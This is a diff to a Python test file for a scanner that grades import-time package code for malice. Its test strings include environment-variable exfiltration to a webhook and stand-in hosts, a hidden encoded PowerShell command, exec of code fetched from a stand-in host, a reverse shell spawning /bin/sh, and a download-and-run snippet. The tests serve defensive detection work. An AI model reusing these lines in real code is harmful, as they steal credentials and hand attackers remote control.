@@ -373,6 +373,10 @@ class ImportTimeGradingTests(unittest.TestCase):
         harvest = "import os, json, requests\nrequests.post('https://discord.com/api/webhooks/1/x', data=json.dumps(dict(os.environ)))\n"
         self.assertEqual(self.grade(harvest)[2], "CRITICAL")
         self.assertIn("sends them to an exfiltration service (discord.com/api/webhooks)", self.grade(harvest)[0][0])
+        # 2.17: what no library sends when it is loaded, sent anywhere
+        anywhere = harvest.replace("discord.com/api/webhooks/1/x", "api.invalid/c")
+        self.assertEqual(self.grade(anywhere)[::2], (
+            ["reads credentials or the whole environment and sends data over the network"], "CRITICAL"))
         for text in (f"subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand {PS_RUN}')\n",
                      "import urllib.request\nexec(urllib.request.urlopen('https://x.invalid/p').read())\n",
                      "s = socket.socket()\ns.connect((h, 4444))\nos.dup2(s.fileno(), 0)\nsubprocess.call(['/bin/sh', '-i'])\n",
@@ -386,8 +390,8 @@ class ImportTimeGradingTests(unittest.TestCase):
         self.assertEqual(self.grade(telemetry)[0], [])                      # host name to its own service
         notifier = "import socket, requests\nrequests.post('https://api.telegram.org/bot/sendMessage', data={'text': socket.gethostname()})\n"
         self.assertEqual(self.grade(notifier)[0], [])                       # a notification library
-        harvest = "import os, json, requests\nrequests.post('https://api.invalid/c', data=json.dumps(dict(os.environ)))\n"
-        self.assertEqual(self.grade(harvest)[2], "MAJOR")
+        one = "import os, requests\nrequests.post('https://api.invalid/c', headers={'key': os.environ['EXAMPLE_KEY']})\n"
+        self.assertEqual(self.grade(one)[0], [])                            # its own key, to its service
         binary = ("const https = require('https');\nhttps.get(u, (r) => r.pipe(fs.createWriteStream(dst)));\n"
                   "execFileSync(dst, ['--version']);\n")
         reasons, _line, sev = self.grade(binary)
